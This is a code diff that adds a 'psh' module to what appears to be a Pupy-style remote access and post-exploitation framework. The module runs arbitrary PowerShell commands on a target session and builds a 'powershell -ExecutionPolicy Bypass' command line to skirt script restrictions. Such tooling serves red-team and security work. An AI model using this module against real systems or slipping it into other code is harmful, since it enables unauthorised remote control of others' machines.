@@ -2493,3 +2493,47 @@ class WmicModule(PupyModule):
             "output": result.get("output", ""),
             "error": result.get("error"),
         }
+
+
+class PshModule(PupyModule):
+    """Run PowerShell commands on the target.
+
+    Upstream Pupy's ``psh`` (via psh agent module). Native reimplementation
+    using powershell on the host.
+    """
+
+    name = "psh"
+    version = "1.0.0"
+    description = "Run PowerShell commands on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        command = str(args.get("command") or args.get("cmd") or "").strip()
+        if not command:
+            return {"status": "error", "error": "command argument is required"}
+
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{command}"'
+        else:
+            cmd = f'pwsh -NoProfile -Command "{command}" 2>/dev/null || powershell -Command "{command}"'
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+    def validate_args(self, args):
+        if not (args.get("command") or args.get("cmd")):
+            return ["Missing required argument: command"]
+        return []
